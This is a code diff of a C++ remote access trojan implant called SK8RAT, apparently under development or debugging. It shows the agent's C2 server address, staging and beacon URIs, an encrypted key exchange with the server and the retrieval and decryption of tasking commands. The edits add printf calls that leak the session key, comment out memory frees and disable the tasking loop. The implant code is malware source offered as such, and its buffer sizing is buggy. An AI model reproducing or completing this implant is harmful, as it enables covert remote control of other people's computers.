@@ -9,7 +9,7 @@ using json = nlohmann::json;
 
 // Global variables: ip/hostname, port, stage0 uri, stage1 uri, stage2 uri, stage3 uri, beacon uri
 // listener_id, symetric key, sleep, jitter
-std::string server_ip = "192.168.1.50";
+std::string server_ip = "192.168.1.2";
 std::string stage0_uri = "/stage0";
 std::string stage1_uri = "/stage1";
 std::string stage2_uri = "/stage2";
@@ -67,7 +67,7 @@ void SK8RAT_EKE(unsigned char * &symmetrickey, std::string &sessioncookie)
 		server_response.erase(server_response.find('"'));
 	}
 
-	// Recieve response and decrypt
+	// Recieve response and decrypt; size(sessionkey_encrypted) = 80
 	std::string sessionkey_encrypted = base64_decode(server_response);
 	const unsigned char* csessionkey_encrypted = (const unsigned char *)sessionkey_encrypted.c_str();
 	unsigned char* sessionkey = new unsigned char[sizeof(sessionkey_encrypted)]; //USE DELETE() WHEN COMPLETE
@@ -230,7 +230,7 @@ void SK8RAT_EKE(unsigned char * &symmetrickey, std::string &sessioncookie)
 
 	// Clean-up dynamically allocated heap
 	delete(ciphertext);
-	delete(sessionkey);
+	//delete(sessionkey);
 	delete(ciphertext2);
 	delete(ciphertext_stage2);
 	delete(ciphertext_stage3);
@@ -241,9 +241,10 @@ void SK8RAT_EKE(unsigned char * &symmetrickey, std::string &sessioncookie)
 
 void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 {
+	printf("sessionkey2: %s\n", symmetrickey);
 	std::string encrypted_tasking = "";
 	agent_get_cookie(server_ip, server_port, beacon_uri, sessioncookie, encrypted_tasking);
-	
+	printf("sessionkey3: %s\n", symmetrickey);
 	// Clean " at beginning and end bc flask ... also cleans \n
 	if (encrypted_tasking.at(0) == '"')
 	{
@@ -251,7 +252,7 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 		encrypted_tasking.erase(encrypted_tasking.find('"'));
 	}
 	//printf("%s\n", encrypted_tasking.c_str());
-
+	
 	// Parse server response
 	std::string nonce = base64_decode(encrypted_tasking.substr(0, encrypted_tasking.find(":")));
 	std::string ciphertext = base64_decode(encrypted_tasking.substr(encrypted_tasking.find(":") + 1));
@@ -259,7 +260,10 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 	const unsigned char* cciphertext = (const unsigned char *)ciphertext.c_str();
 
 	// Decrypt server response with sessionkey
-	unsigned char* server_response = new unsigned char[sizeof(ciphertext)]; //USE DELETE() WHEN COMPLETE
+	unsigned char* server_response = new unsigned char[size(ciphertext)]; //USE DELETE() WHEN COMPLETE
+	//printf("sizeof(ciphertext): %i\n", sizeof(ciphertext));
+	//printf("size(ciphertext): %i\n", size(ciphertext));
+	
 	if (crypto_secretbox_open_easy(server_response, cciphertext, size(ciphertext), cnonce, symmetrickey) != 0) {
 		printf("challenge-response decryption failed :(\n");
 		SleepJitter(sleep, jitter);
@@ -287,13 +291,27 @@ int main(int argc, char **argv)
 	// Perform encrypted key exchange and save final symmetric key and session cookie
 	unsigned char * symmetrickey = NULL;
 	std::string sessioncookie = "";
-	SK8RAT_EKE(symmetrickey, sessioncookie); 
+	SK8RAT_EKE(symmetrickey, sessioncookie);
 	
 	// Allow time for server for database writes
-	Sleep(6000);
+	//Sleep(5000);
+	printf("sessionkey1: %s\n", symmetrickey);
 
 	// Begin tasking loop, you will infinite loop this
-	SK8RAT_tasking(symmetrickey, sessioncookie);
+	//while (true)
+	//{
+		//SK8RAT_tasking(symmetrickey, sessioncookie);
+	//}
+	
+
+	//const char *sessionkey = "hello";
+	//char b[6] = {};
+	//strncpy_s(b, sessionkey, sizeof(b) - 1);
+	//printf("%s\n", b);
+
+
+
+	
 	
 
 	
